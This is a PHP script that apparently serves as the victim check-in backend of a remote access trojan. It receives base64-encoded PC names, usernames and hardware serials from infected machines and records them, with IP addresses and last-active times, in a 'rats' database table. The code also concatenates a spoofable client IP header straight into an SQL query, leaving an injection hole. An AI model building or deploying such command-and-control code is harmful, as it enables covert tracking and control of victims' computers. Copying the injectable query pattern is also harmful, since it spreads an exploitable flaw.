<?php

require_once "database.php";

function getip(){
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
	    $ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
	    $ip = $_SERVER['REMOTE_ADDR'];
	}
	return str_replace("::1", "localhost", $ip);
}

$data = explode("|", $_GET["data"]);

if($link->query("SELECT * FROM rats WHERE ip = '".getip()."'")->num_rows === 0){
	$sql = "INSERT INTO rats (pcname, username, ip, disk_serial, baseboard_serial, ram_serial, cpu) VALUES (?, ?, ?, ?, ?, ?, ?)";
	if($stmt = $link->prepare($sql)){
        $stmt->bind_param("sssssss", $pcname, $username, $ip, $disk_serial, $baseboard_serial, $ram_serial, $cpu);

        $pcname = base64_decode($data[0]);
        $username = base64_decode($data[1]);

        $ip = getip();

        $disk_serial = base64_decode($data[2]);
        $baseboard_serial = base64_decode($data[3]);
        $ram_serial = base64_decode($data[4]);

        $cpu = base64_decode($data[5]);

        $last_active = date("Y-m-d h:i:s");


        if($stmt->execute()){
            echo "success";
        }else{
        	echo "error";
        }
    }else{
    	echo "error";
    }   
}else{
	$sql = "UPDATE rats SET pcname = ?, username = ?, disk_serial = ?, baseboard_serial = ?, ram_serial = ?, cpu = ?, last_active = ? WHERE ip = ?";
	if($stmt = $link->prepare($sql)){
        $stmt->bind_param("ssssssss", $pcname, $username, $disk_serial, $baseboard_serial, $ram_serial, $cpu, $last_active, $ip);

        $pcname = base64_decode($data[0]);
        $username = base64_decode($data[1]);

        $disk_serial = base64_decode($data[2]);
        $baseboard_serial = base64_decode($data[3]);
        $ram_serial = base64_decode($data[4]);

        $cpu = base64_decode($data[5]);

        $last_active = date("Y-m-d h:i:s");

        $ip = getip();

        if($stmt->execute()){
            echo "success";
        }else{
        	echo "error";
        }
    }else{
    	echo "error";
    }  
}

?>
